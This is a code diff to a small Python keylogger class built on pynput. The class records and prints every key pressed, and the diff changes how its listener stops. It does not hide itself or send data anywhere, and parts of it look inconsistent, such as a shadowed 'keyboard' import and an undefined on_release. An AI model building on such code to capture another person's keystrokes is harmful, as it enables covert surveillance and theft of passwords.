@@ -1,3 +1,4 @@
+import keyboard
 from pynput import keyboard
 from pynput.keyboard import Key, Listener
 from abc import ABC, abstractmethod
@@ -23,12 +24,12 @@ class IKeyLogger(ABC):
 class keyboard_track(IKeyLogger):
     def __init__(self):
         self.keys = ''
-        self.listener = None
+
 
 
     def on_press(self,key):
         if key == Key.esc:
-            self.listener.stop()
+            return False
         self.keys += str(key).replace("'", "")
         print(key)
 
@@ -38,11 +39,11 @@ class keyboard_track(IKeyLogger):
 
 
     def start_logging(self) :
-        with Listener(on_press=self.on_press,on_release=self.stop_logging()) as self.listener:
-             self.listener.join()
+        with Listener(on_press=self.on_press,on_release=self.on_release) as listener:
+             listener.join()
 
     def stop_logging(self):
-
+        keyboard.send("esc")
 
 
     def get_logged_keys(self,key):
